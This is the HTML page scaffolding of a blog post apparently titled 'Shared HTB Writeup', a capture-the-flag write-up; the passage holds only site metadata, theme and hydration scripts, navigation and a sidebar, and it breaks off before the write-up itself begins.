<!DOCTYPE html><html class="transition bg-[var(--page-bg)] md:text-[16px] text-[14px]" data-astro-cid-sckkx6r4 data-isHome=false lang=en style=--configHue:250><head><title>Shared HTB Writeup - Mil4ne</title><meta charset=UTF-8><meta content="Medium Machine" name=description><meta content=Mil4ne name=author><meta content=Mil4ne property=og:site_name><meta content=https://fuwari.vercel.app/posts/shared/ property=og:url><meta content="Shared HTB Writeup - Mil4ne" property=og:title><meta content="Medium Machine" property=og:description><meta content=summary_large_image name=twitter:card><meta content=https://fuwari.vercel.app/posts/shared/ property=twitter:url><meta content="Shared HTB Writeup - Mil4ne" name=twitter:title><meta content="Medium Machine" name=twitter:description><meta content="width=device-width" name=viewport><meta content="Astro v4.11.0" name=generator><link href=/favicon/icon.png rel=icon media="(prefers-color-scheme: dark)" sizes=32x32><script>!function(){switch(localStorage.getItem("theme")||"auto"){case"light":document.documentElement.classList.remove("dark");break;case"dark":document.documentElement.classList.add("dark");break;case"auto":window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")}}()</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Shared HTB Writeup","description":"Medium Machine","keywords":["Linux","Medium"],"author":{"@type":"Person","name":"Mil4ne","url":"https://fuwari.vercel.app/"},"datePublished":"2024-06-01"}</script><link href=https://cdn.staticfile.org/KaTeX/0.16.9/katex.min.css rel=stylesheet crossorigin=anonymous integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV><link href=https://fuwari.vercel.app/rss.xml rel=alternate title=Mil4ne type=application/rss+xml><link href=/_astro/hoisted.aW6J7aTb.css rel=stylesheet><style>#post-container :first-child{animation-delay:calc(var(--content-delay) + 0ms)}#post-container :nth-child(2){animation-delay:calc(var(--content-delay) + 50ms)}#post-container :nth-child(3){animation-delay:calc(var(--content-delay) + .1s)}#post-container :nth-child(4){animation-delay:calc(var(--content-delay) + 175ms)}#post-container :nth-child(5){animation-delay:calc(var(--content-delay) + .25s)}#post-container :nth-child(6){animation-delay:calc(var(--content-delay) + 325ms)}</style><link href=/_astro/_page_.Cqgg-kM5.css rel=stylesheet><link href=/_astro/_page_.DImNEAs0.css rel=stylesheet><link href=/_astro/about.B4ABUC8K.css rel=stylesheet><link href=/_astro/_category_.vxujU0QL.css rel=stylesheet><style>#display-setting.svelte-3akcb9 input[type=range].svelte-3akcb9{-webkit-appearance:none;height:1.5rem;background-image:var(--color-selection-bar);transition:background-image .15s ease-in-out}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb:active{background:#fff9}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;border-width:0;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb:active{background:#fff9}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb:active{background:#fff9}</style><script type=module src=/_astro/hoisted.DaJ843G5.js></script><script type=module src=/_astro/page.3zT6KwRv.js></script></head><body class="transition min-h-screen" data-astro-cid-sckkx6r4 style=--configHue:250><div id=config-carrier data-hue=250></div><div><div class="w-full absolute" id=banner-wrapper style=--configHue:250 data-astro-cid-sckkx6r4><div class="overflow-hidden relative h-full hidden object-center object-cover"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Banner image of the blog" class="w-full h-full object-cover" decoding=async height=506 loading=lazy src=/_astro/main.BGOttbhW_CEd3.webp style=object-position:center width=506></div></div><div class="relative mx-auto gap-4 grid grid-cols-[17.5rem_auto] grid-rows-[auto_auto_1fr_auto] lg:grid-rows-[auto_1fr_auto] max-w-[var(--page-width)] md:px-4 min-h-screen px-0"><div class="onload-animation col-span-2 grid-rows-1 z-50" id=top-row><div class="transition absolute -top-8 bg-[var(--card-bg)] h-8 left-0 right-0"></div><div class="flex items-center justify-between card-base h-[4.5rem] max-w-[var(--page-width)] mx-auto overflow-visible px-4 rounded-t-none sticky top-0"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-[3.25rem]"><div class="flex items-center flex-row text-[var(--primary)] text-md"><svg data-icon=material-symbols:home-outline-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[1.75rem] mb-1 mr-2"><symbol id=ai:material-symbols:home-outline-rounded><path d="M6 19h3v-5q0-.425.288-.712T10 13h4q.425 0 .713.288T15 14v5h3v-9l-6-4.5L6 10zm-2 0v-9q0-.475.213-.9t.587-.7l6-4.5q.525-.4 1.2-.4t1.2.4l6 4.5q.375.275.588.7T20 10v9q0 .825-.588 1.413T18 21h-4q-.425 0-.712-.288T13 20v-5h-2v5q0 .425-.288.713T10 21H6q-.825 0-1.412-.587T4 19m8-6.75" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:home-outline-rounded></use></svg> Mil4ne</div></a><div class="md:flex hidden"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Home><div class="flex items-center">Home</div></a><a href=/archive/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Archive><div class="flex items-center">Archive</div></a><a href=/about/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=About><div class="flex items-center">About</div></a><a href="https://github.com/mil4ne?tab=repositories" class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=GitHub target=_blank><div class="flex items-center">GitHub <svg data-icon=fa6-solid:arrow-up-right-from-square height=1em viewBox="0 0 512 512" width=1em class="transition -translate-y-[1px] dark:text-white/[0.2] ml-1 text-[0.875rem] text-black/[0.2]"><symbol id=ai:fa6-solid:arrow-up-right-from-square><path d="M320 0c-17.7 0-32 14.3-32 32s14.3 32 32 32h82.7L201.4 265.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L448 109.3V192c0 17.7 14.3 32 32 32s32-14.3 32-32V32c0-17.7-14.3-32-32-32zM80 32C35.8 32 0 67.8 0 112v320c0 44.2 35.8 80 80 80h320c44.2 0 80-35.8 80-80V320c0-17.7-14.3-32-32-32s-32 14.3-32 32v112c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h112c17.7 0 32-14.3 32-32s-14.3-32-32-32z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:arrow-up-right-from-square></use></svg></div></a></div><div class=flex><style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(self.Astro||(self.Astro={})).load=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:load")),(()=>{var t=Object.defineProperty,e=(e,r,n)=>((e,r,n)=>r in e?t(e,r,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[r]=n)(e,"symbol"!=typeof r?r+"":r,n);{let t={0:t=>s(t),1:t=>n(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(n(t)),5:t=>new Set(n(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t)},r=e=>{let[r,n]=e;return r in t?t[r](n):void 0},n=t=>t.map(r),s=t=>"object"!=typeof t||null===t?t:Object.fromEntries(Object.entries(t).map((([t,e])=>[t,r(e)])));class i extends HTMLElement{constructor(){super(...arguments),e(this,"Component"),e(this,"hydrator"),e(this,"hydrate",(async()=>{var t;if(!this.hydrator||!this.isConnected)return;let e=null==(t=this.parentElement)?void 0:t.closest("astro-island[ssr]");if(e)return void e.addEventListener("astro:hydrate",this.hydrate,{once:!0});let r,n=this.querySelectorAll("astro-slot"),i={},o=this.querySelectorAll("template[data-astro-template]");for(let t of o){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("data-astro-template")||"default"]=t.innerHTML,t.remove())}for(let t of n){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("name")||"default"]=t.innerHTML)}try{r=this.hasAttribute("props")?s(JSON.parse(this.getAttribute("props"))):{}}catch(t){let e=this.getAttribute("component-url")||"<unknown>",r=this.getAttribute("component-export");throw r&&(e+=` (export ${r})`),console.error(`[hydrate] Error parsing props for component ${e}`,this.getAttribute("props"),t),t}await this.hydrator(this)(this.Component,r,i,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))})),e(this,"unmount",(()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))}))}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(this.hasAttribute("await-children")&&"interactive"!==document.readyState&&"complete"!==document.readyState){let t=()=>{document.removeEventListener("DOMContentLoaded",t),e.disconnect(),this.childrenConnectedCallback()},e=new MutationObserver((()=>{var e;(null==(e=this.lastChild)?void 0:e.nodeType)===Node.COMMENT_NODE&&"astro:end"===this.lastChild.nodeValue&&(this.lastChild.remove(),t())}));e.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",t)}else this.childrenConnectedCallback()}async childrenConnectedCallback(){let t=this.getAttribute("before-hydration-url");t&&await import(t),this.start()}async start(){let t=JSON.parse(this.getAttribute("opts")),e=this.getAttribute("client");if(void 0!==Astro[e])try{await Astro[e]((async()=>{let t=this.getAttribute("renderer-url"),[e,{default:r}]=await Promise.all([import(this.getAttribute("component-url")),t?import(t):()=>()=>{}]),n=this.getAttribute("component-export")||"default";if(n.includes(".")){this.Component=e;for(let t of n.split("."))this.Component=this.Component[t]}else this.Component=e[n];return this.hydrator=r,this.hydrate}),t,this)}catch(t){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,t)}else window.addEventListener(`astro:${e}`,(()=>this.start()),{once:!0})}attributeChangedCallback(){this.hydrate()}}e(i,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",i)}})()</script><astro-island await-children="" client=load component-export=default component-url=/_astro/Search.CblrOaEi.js opts={&quot;name&quot;:&quot;Search&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=1HEXhg><div class="rounded-lg items-center bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hidden hover:bg-black/[0.06] lg:flex mr-2 transition-all" id=search-bar><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-[1.25rem] text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 active:w-60 h-full transition-all w-40" placeholder=Search value=""></div><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 lg:hidden" aria-label="Search Panel" id=search-switch><astro-slot name=search-switch><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class=text-[1.25rem] slot=search-switch><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot></button><div class="absolute float-panel-closed float-panel right-4 left-4 md:left-[unset] md:w-[30rem] p-2 rounded-2xl search-panel shadow-2xl top-20" id=search-panel><div class="flex items-center relative bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hover:bg-black/[0.06] lg:hidden rounded-xl transition-all" id=search-bar-inside><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-[1.25rem] text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 absolute inset-0" placeholder=Search value=""></div></div><template data-astro-template=arrow-icon><svg data-icon=fa6-solid:chevron-right height=1em viewBox="0 0 320 512" width=0.63em class="transition text-[var(--primary)] my-auto text=[0.75rem] translate-x-0.5" slot=arrow-icon><symbol id=ai:fa6-solid:chevron-right><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256L73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:chevron-right></use></svg></template></astro-island><astro-island await-children="" client=load component-export=default component-url=/_astro/LightDarkSwitch.DHl4X0jL.js opts={&quot;name&quot;:&quot;LightDarkSwitch&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=ZdT6eb><div class="relative z-50" role=menu tabindex=-1><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 relative" aria-label="Light/Dark Mode" id=scheme-switch role=menuitem><div class="absolute opacity-0"></div><div class="absolute opacity-0"></div><div class=absolute></div></button><div class="transition absolute -right-2 float-panel-closed hidden lg:block pt-5 top-11" id=light-dark-panel><div class="card-base float-panel p-2"><button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Light</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Dark</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap current-theme-btn">System</button></div></div></div></astro-island><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 md:hidden" aria-label=Menu id=nav-menu-switch name="Nav Menu"><svg data-icon=material-symbols:menu-rounded height=1em viewBox="0 0 24 24" width=1em class=text-[1.25rem]><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></button></div><div class="absolute float-panel-closed float-panel right-4 fixed px-2 py-2 transition-all" id=nav-menu-panel><a href=/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Home</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/archive/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Archive</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/about/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">About</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href="https://github.com/mil4ne?tab=repositories" class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2" target=_blank><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">GitHub</div><svg data-icon=fa6-solid:arrow-up-right-from-square height=1em viewBox="0 0 512 512" width=1em class="transition -translate-x-1 dark:text-white/25 text-[0.75rem] text-black/25"><use xlink:href=#ai:fa6-solid:arrow-up-right-from-square></use></svg></a></div><script>(self.Astro||(self.Astro={})).only=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:only"))</script><astro-island await-children="" client=only component-export=default component-url=/_astro/DisplaySettings.DyrDa_UI.js opts={&quot;name&quot;:&quot;DisplaySettings&quot;,&quot;value&quot;:&quot;svelte&quot;} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=1IwgJN><template data-astro-template=restore-icon><svg data-icon=fa6-solid:arrow-rotate-left height=1em viewBox="0 0 512 512" width=1em class=text-[0.875rem] slot=restore-icon><symbol id=ai:fa6-solid:arrow-rotate-left><path d="M125.7 160H176c17.7 0 32 14.3 32 32s-14.3 32-32 32H48c-17.7 0-32-14.3-32-32V64c0-17.7 14.3-32 32-32s32 14.3 32 32v51.2l17.6-17.6c87.5-87.5 229.3-87.5 316.8 0s87.5 229.3 0 316.8s-229.3 87.5-316.8 0c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0c62.5 62.5 163.8 62.5 226.3 0s62.5-163.8 0-226.3s-163.8-62.5-226.3 0z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:arrow-rotate-left></use></svg></template></astro-island></div><script>!async function(){const i=await import("/pagefind/pagefind.js");await i.options({excerptLength:20}),i.init(),window.pagefind=i,i.search("")}()</script></div><div class="w-full col-span-2 lg:col-span-1 lg:max-w-[17.5rem] lg:row-end-3 lg:row-start-2 onload-animation row-end-4 row-start-3" id=sidebar><div class="flex w-full gap-4 flex-col mb-4"><div class="card-base p-3"><a href=/about/ class="overflow-hidden relative lg:mt-0 mx-auto active:scale-95 block group lg:max-w-none lg:mx-0 max-w-[240px] mb-3 mt-1 rounded-xl" aria-label="Go to About Page"><div class="transition flex items-center justify-center absolute group-active:bg-black/50 group-hover:bg-black/30 h-full pointer-events-none w-full z-50"><svg data-icon=fa6-regular:address-card height=1em viewBox="0 0 576 512" width=1.13em class="transition group-hover:opacity-100 group-hover:scale-100 opacity-0 scale-90 text-5xl text-white"><symbol id=ai:fa6-regular:address-card><path d="M512 80c8.8 0 16 7.2 16 16v320c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V96c0-8.8 7.2-16 16-16zM64 32C28.7 32 0 60.7 0 96v320c0 35.3 28.7 64 64 64h448c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64zm144 224a64 64 0 1 0 0-128a64 64 0 1 0 0 128m-32 32c-44.2 0-80 35.8-80 80c0 8.8 7.2 16 16 16h192c8.8 0 16-7.2 16-16c0-44.2-35.8-80-80-80zm200-144c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-regular:address-card></use></svg></div><div class="overflow-hidden relative h-full lg:mt-0 lg:w-full mx-auto"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Profile Image of the Author" class="w-full h-full object-cover" decoding=async height=506 loading=lazy src=/_astro/main.BGOttbhW_CEd3.webp style=object-position:center width=506></div></a><div class=px-2><div class="transition font-bold dark:text-neutral-50 mb-1 text-center text-xl">Mil4ne</div><div class="transition mb-2 bg-[var(--primary)] h-1 mx-auto rounded-full w-5"></div><div class="transition text-center mb-2.5 text-neutral-400">#RoadToCBBH</div><div class="flex gap-2 justify-center mb-1"><a href=https://twitter.com class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=;V target=_blank rel=me><svg data-icon=fa6-brands:steam height=1em viewBox="0 0 496 512" width=0.97em class=text-[1.5rem]><symbol id=ai:fa6-brands:steam><path d="M496 256c0 137-111.2 248-248.4 248c-113.8 0-209.6-76.3-239-180.4l95.2 39.3c6.4 32.1 34.9 56.4 68.9 56.4c39.2 0 71.9-32.4 70.2-73.5l84.5-60.2c52.1 1.3 95.8-40.9 95.8-93.5c0-51.6-42-93.5-93.7-93.5s-93.7 42-93.7 93.5v1.2L176.6 279c-15.5-.9-30.7 3.4-43.5 12.1L0 236.1C10.2 108.4 117.1 8 247.6 8C384.8 8 496 119 496 256M155.7 384.3l-30.5-12.6a52.79 52.79 0 0 0 27.2 25.8c26.9 11.2 57.8-1.6 69-28.4c5.4-13 5.5-27.3.1-40.3c-5.4-13-15.5-23.2-28.5-28.6c-12.9-5.4-26.7-5.2-38.9-.6l31.5 13c19.8 8.2 29.2 30.9 20.9 50.7c-8.3 19.9-31 29.2-50.8 21m173.8-129.9c-34.4 0-62.4-28-62.4-62.3s28-62.3 62.4-62.3s62.4 28 62.4 62.3s-27.9 62.3-62.4 62.3m.1-15.6c25.9 0 46.9-21 46.9-46.8c0-25.9-21-46.8-46.9-46.8s-46.9 21-46.9 46.8c.1 25.8 21.1 46.8 46.9 46.8" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:steam></use></svg> </a><a href=https://store.steampowered.com class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=Steam target=_blank rel=me><svg data-icon=fa6-brands:steam height=1em viewBox="0 0 496 512" width=0.97em class=text-[1.5rem]><use xlink:href=#ai:fa6-brands:steam></use></svg> </a><a href=https://github.com/mil4ne class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=GitHub target=_blank rel=me><svg data-icon=fa6-brands:github height=1em viewBox="0 0 496 512" width=0.97em class=text-[1.5rem]><symbol id=ai:fa6-brands:github><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6c-3.3.3-5.6-1.3-5.6-3.6c0-2 2.3-3.6 5.2-3.6c3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9c2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9c.3 2 2.9 3.3 5.9 2.6c2.9-.7 4.9-2.6 4.6-4.6c-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2c12.8 2.3 17.3-5.6 17.3-12.1c0-6.2-.3-40.4-.3-61.4c0 0-70 15-84.7-29.8c0 0-11.4-29.1-27.8-36.6c0 0-22.9-15.7 1.6-15.4c0 0 24.9 2 38.6 25.8c21.9 38.6 58.6 27.5 72.9 20.9c2.3-16 8.8-27.1 16-33.7c-55.9-6.2-112.3-14.3-112.3-110.5c0-27.5 7.6-41.3 23.6-58.9c-2.6-6.5-11.1-33.3 2.6-67.9c20.9-6.5 69 27 69 27c20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27c13.7 34.7 5.2 61.4 2.6 67.9c16 17.7 25.8 31.5 25.8 58.9c0 96.5-58.9 104.2-114.8 110.5c9.2 7.9 17 22.9 17 46.4c0 33.7-.3 75.4-.3 83.6c0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252C496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2c1.6 1.6 3.9 2.3 5.2 1c1.3-1 1-3.3-.7-5.2c-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9c1.6 1 3.6.7 4.3-.7c.7-1.3-.3-2.9-2.3-3.9c-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2c2.3 2.3 5.2 2.6 6.5 1c1.3-1.3.7-4.3-1.3-6.2c-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9c1.6 2.3 4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2c-1.4-2.3-4-3.3-5.6-2" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:github></use></svg></a></div></div></div></div><div class="flex w-full gap-4 flex-col top-4 top-4 sticky"><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ucso7hve data-id=categories data-is-collapsed=false style=animation-delay:150ms;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve>Categories</div><div class="overflow-hidden collapse-wrapper px-4" id=categories style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><a href=/archive/category/HackTheBox/ aria-label="View all posts in the HackTheBox category"><button class="rounded-lg active:bg-[var(--btn-plain-bg-active)] hover:bg-[var(--btn-plain-bg-hover)] bg-none dark:hover:text-[var(--primary)] dark:text-neutral-300 h-10 hover:pl-3 hover:text-[var(--primary)] pl-2 text-neutral-700 transition-all w-full"><div class="flex items-center justify-between mr-2 relative"><div class="overflow-hidden overflow-ellipsis whitespace-nowrap text-left">HackTheBox</div><div class="transition flex items-center rounded-lg bg-[oklch(0.95_0.025_var(--hue))] dark:bg-[var(--primary)] dark:text-[var(--deep-text)] font-bold h-7 justify-center min-w-[2rem] ml-4 text-[var(--btn-content)] text-sm">16</div></div></button></a></div></widget-layout><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ucso7hve data-id=tags data-is-collapsed=false style=animation-delay:.2s;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve>Tags</div><div class="overflow-hidden collapse-wrapper px-4" id=tags style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><div class="flex flex-wrap gap-2"><a href=/archive/tag/Easy/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Easy tag">Easy </a><a href=/archive/tag/Hard/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Hard tag">Hard </a><a href=/archive/tag/Linux/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Linux tag">Linux </a><a href=/archive/tag/Medium/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Medium tag">Medium </a><a href=/archive/tag/Windows/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Windows tag">Windows</a></div></div></widget-layout></div></div><div class="overflow-hidden onload-animation col-span-2 lg:col-span-1 row-end-3 row-start-2" id=content-wrapper><main class=transition-fade id=swup><div class="flex w-full mb-4 overflow-hidden relative rounded-[var(--radius-large)]"><div class="w-full relative card-base md:px-9 pb-4 pt-6 px-6 z-10" id=post-container><div class="transition flex dark:text-white/30 flex-row gap-5 mb-3 onload-animation text-black/30"><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:notes-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:notes-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h10q.425 0 .713.288T15 17t-.288.713T14 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:notes-rounded></use></svg></div><div class=text-sm>1803 words</div></div><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:schedule-outline-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:schedule-outline-rounded><path d="M13 11.6V8q0-.425-.288-.712T12 7t-.712.288T11 8v3.975q0 .2.075.388t.225.337l3.3 3.3q.275.275.7.275T16 16t.275-.7t-.275-.7zM12 22q-2.075 